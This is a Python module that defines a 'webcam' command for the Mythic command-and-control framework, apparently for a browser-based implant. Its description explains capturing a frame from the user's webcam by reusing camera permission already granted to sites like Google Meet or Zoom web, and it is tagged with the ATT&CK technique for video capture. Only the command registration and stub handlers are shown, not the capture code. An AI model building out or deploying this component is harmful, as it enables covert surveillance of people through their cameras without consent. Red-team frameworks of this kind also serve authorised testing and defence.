from mythic_container.MythicCommandBase import (
    CommandBase, TaskArguments,
    MythicTask, PTTaskMessageAllData,
    PTTaskProcessResponseMessageResponse, CommandAttributes,
)


class WebcamArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class WebcamCommand(CommandBase):
    cmd            = "webcam"
    needs_admin    = False
    help_cmd       = "webcam"
    description    = (
        "Capture a single frame from the user's webcam via getUserMedia. "
        "Works on pages where camera permission was previously granted "
        "(e.g. Google Meet, Zoom web). 10 s timeout."
    )
    version        = 1
    author         = "@asaurusrex"
    argument_class = WebcamArguments
    parameters     = []
    attackmapping  = ["T1125"]
    attributes     = CommandAttributes(filter_by_build_parameter={}, supported_os=[])

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        task.display_params = ""
        return task

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
